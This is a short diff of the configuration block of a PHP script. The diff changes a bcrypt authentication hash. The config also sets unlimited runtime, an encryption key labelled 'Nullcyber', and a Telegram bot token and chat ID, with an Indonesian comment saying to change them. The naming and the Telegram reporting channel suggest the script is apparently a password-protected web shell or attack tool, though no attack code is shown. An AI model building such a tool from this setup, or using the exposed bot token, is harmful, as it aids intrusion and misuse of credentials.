@@ -13,7 +13,7 @@ set_time_limit(0);
 
 // ==================== CONFIG ====================
 $ENCRYPTION_KEY = 'Nullcyber123!@#';
-$AUTH_HASH = '$2y$10$m5ABp9EqwyEKBd7o2kqFM.e8TjMo3Oh73bzepNzM5k32x9mCfg3Py';
+$AUTH_HASH = '$2y$10$T3WWC0/w10UtD5BJuuTy9eOLNMrckcb6xYOe3UkwWKAuYLqp8AJSS';
 // TELEGRAM CONFIG - GANTI INI!
 $TELEGRAM_BOT_TOKEN = '8055884841:AAHNymaFqhfIBp7vYw4lkHLncykvHpOBZjM';
 $TELEGRAM_CHAT_ID = '1883446251';
